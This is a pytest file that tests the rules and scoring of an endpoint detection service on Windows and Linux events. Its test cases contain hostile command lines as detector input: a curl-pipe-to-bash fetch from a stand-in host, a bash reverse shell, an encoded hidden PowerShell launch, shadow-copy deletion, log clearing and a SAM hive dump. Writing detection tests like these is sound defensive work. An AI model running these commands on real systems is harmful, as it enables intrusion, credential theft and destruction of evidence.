"""Endpoint detection: features, rules and scoring for Windows and Linux events."""

from datetime import datetime, timedelta

import pandas as pd
import pytest

from app.services.endpoint_detection import (
    command_indicators,
    evaluate_endpoint_row,
    score_endpoint_frame,
)


def _frame(events: list[dict]) -> pd.DataFrame:
    base_ts = datetime(2026, 10, 20, 3, 0, 0)
    rows = []
    for i, e in enumerate(events):
        row = {
            "device_id": 1, "category": "system", "event_type": "x", "username": None,
            "process_name": None, "process_path": None, "command_line": None, "pid": None,
            "parent_process": None, "parent_pid": None, "src_ip": None, "dst_ip": None,
            "dst_port": None, "file_path": None, "message": None, "raw": None, "source": "test",
            "timestamp": base_ts + timedelta(seconds=i * 30),
        }
        row.update(e)
        row["id"] = i + 1
        rows.append(row)
    return pd.DataFrame(rows)


# --- command indicators --------------------------------------------------------------
@pytest.mark.parametrize("cmd,expected", [
    ("powershell -nop -w hidden -enc aGVsbG8gd29ybGQgdGVzdGluZyE=", True),
    ("curl http://evil.example/sh | bash", True),
    ("vssadmin delete shadows /all /quiet", True),
    ("wevtutil cl Security", True),
    ("reg save hklm\\sam c:\\temp\\sam.hiv", True),
    ("notepad.exe document.txt", False),
    ("python train_model.py --epochs 5", False),
])
def test_command_indicators(cmd, expected):
    assert bool(command_indicators(cmd)) is expected


# --- rules (Windows-style) -----------------------------------------------------------
def test_windows_bruteforce_then_success():
    from app.services.endpoint_detection import build_endpoint_features

    events = [{"category": "authentication", "event_type": "logon_failure", "username": "admin", "src_ip": "203.0.113.5"} for _ in range(5)]
    events.append({"category": "authentication", "event_type": "logon_success", "username": "admin", "src_ip": "203.0.113.5"})
    df = build_endpoint_features(_frame(events))
    _, hits_fail = evaluate_endpoint_row(df.iloc[4])
    _, hits_success = evaluate_endpoint_row(df.iloc[5])
    assert "EP-AUTH-1" in {h["code"] for h in hits_fail}
    assert "EP-AUTH-2" in {h["code"] for h in hits_success}


def test_suspicious_powershell_rule():
    df = score_endpoint_frame(_frame([{
        "category": "process", "event_type": "process_start", "process_name": "powershell.exe",
        "command_line": "powershell -nop -w hidden -enc aGVsbG8gdGhpcyBpcyBhIHRlc3Q=",
    }]))
    assert "EP-PROC-1" in {h["code"] for h in df.iloc[0]["triggered_rules"]}
    assert df.iloc[0]["risk_score"] >= 50


def test_log_cleared_is_high_risk():
    df = score_endpoint_frame(_frame([{"category": "system", "event_type": "log_cleared", "username": "admin"}]))
    assert df.iloc[0]["risk_score"] >= 50
    assert df.iloc[0]["severity"] in ("high", "critical")


def test_privileged_group_addition():
    ev = {"category": "persistence", "event_type": "group_member_added", "raw": {"group": "Administrators"}}
    df = score_endpoint_frame(_frame([ev]))
    assert "EP-ACCT-2" in {h["code"] for h in df.iloc[0]["triggered_rules"]}


# --- rules (Linux-style) -------------------------------------------------------------
def test_linux_sensitive_file_and_persistence():
    events = [
        {"category": "file", "event_type": "file_modified", "file_path": "/etc/shadow"},
        {"category": "persistence", "event_type": "cron_modified", "file_path": "/etc/crontab"},
        {"category": "network", "event_type": "listen_port_opened", "process_name": "nc", "dst_port": 4444},
    ]
    df = score_endpoint_frame(_frame(events))
    codes = {h["code"] for hits in df["triggered_rules"] for h in hits}
    assert {"EP-FILE-1", "EP-PERS-1", "EP-NET-3"} <= codes


def test_reverse_shell_command_indicator():
    df = score_endpoint_frame(_frame([{
        "category": "process", "event_type": "process_start", "process_name": "bash",
        "command_line": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
    }]))
    assert "EP-PROC-1" in {h["code"] for h in df.iloc[0]["triggered_rules"]}


def test_external_rare_destination():
    # one external connection among many internal ones
    events = [{"category": "network", "event_type": "network_connection", "dst_ip": "10.0.0.5", "dst_port": 443} for _ in range(5)]
    events.append({"category": "network", "event_type": "network_connection", "dst_ip": "8.8.8.8", "dst_port": 4444})
    df = score_endpoint_frame(_frame(events))
    codes = {h["code"] for h in df.iloc[-1]["triggered_rules"]}
    assert "EP-NET-1" in codes or "EP-NET-2" in codes


# --- scoring behaviour ---------------------------------------------------------------
def test_scores_within_bounds_and_normal_is_low():
    events = [{"category": "process", "event_type": "process_start", "process_name": "explorer.exe"} for _ in range(5)]
    df = score_endpoint_frame(_frame(events))
    assert df["risk_score"].between(0, 100).all()
    assert (df["severity"] == "low").all()


def test_sparse_data_uses_pure_rules():
    # Fewer than 50 events: ML is not fitted, so risk equals the rule score.
    df = score_endpoint_frame(_frame([{"category": "system", "event_type": "log_cleared"}]))
    row = df.iloc[0]
    assert row["ml_score"] == 0
    assert row["risk_score"] == row["rule_score"]


def test_explanation_present():
    df = score_endpoint_frame(_frame([{"category": "system", "event_type": "log_cleared"}]))
    assert "Rules triggered" in df.iloc[0]["explanation"]


